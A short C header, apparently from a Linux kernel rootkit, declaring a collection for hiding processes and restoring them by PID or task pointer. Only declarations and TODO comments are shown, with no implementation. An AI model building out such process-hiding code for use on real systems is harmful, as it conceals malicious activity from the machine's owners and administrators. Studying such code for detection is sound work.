typedef struct hiddenProcessCollection *HiddenProcessCollection;

struct restorableHiddenTask { //TODO: rename this
	void *task;
	struct pid *originalPid;
	int pidNumber;
};

HiddenProcessCollection createHiddenProcessCollection(void);
void destoryHiddenProcessCollection(HiddenProcessCollection collection);
int isHiddenProcessCollectionFull(HiddenProcessCollection collection);
void addHiddenProcessToCollection(HiddenProcessCollection collection, struct restorableHiddenTask restorableHiddenTask);

int isPidInCollection(HiddenProcessCollection collection, int pid);
struct restorableHiddenTask removePidFromCollection(HiddenProcessCollection collection, int pid);

int isTaskInCollection(HiddenProcessCollection collection, void *task);
struct restorableHiddenTask removeTaskFromCollection(HiddenProcessCollection collection, void *task); //TODO: chagne this not to use void*
